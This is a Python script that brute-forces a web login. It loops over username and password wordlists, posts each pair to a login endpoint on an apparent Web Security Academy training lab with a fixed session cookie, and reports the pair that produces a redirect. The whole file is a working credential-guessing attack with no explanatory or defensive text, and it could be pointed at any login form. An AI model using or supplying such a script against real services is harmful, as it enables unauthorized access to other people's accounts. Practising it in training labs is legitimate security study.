#!/bin/python3

import os

import requests

f = open("./passwords.txt",'r')
passwords = f.readlines()

f = open("./usernames.txt",'r')
usernames = f.readlines()




def cracking():
    print("<CRACKING LOGIN>")
    for username in usernames:
        username = username.strip("\n")
        for password in passwords:
            password = password.strip("\n")
            cookies = {
                'session': 'zJmV2dc0SEfabL1TZduGEd6XB51br9RM',
            }

            headers = {}

            data = {
                'username': username,
                'password': password
            }

            response = requests.post('https://0a4100fc04715d9ac0829b6700a80044.web-security-academy.net/login', cookies=cookies, headers=headers, data=data, verify=True, allow_redirects=False)

            if response.status_code == 302:
                print("\nCRACKED\n" + "Username is: " + username + "  Password is: " + password)
                return
            else:
                print("Username: " + username + "  Password: " + password + "        ", end="\r")


cracking()
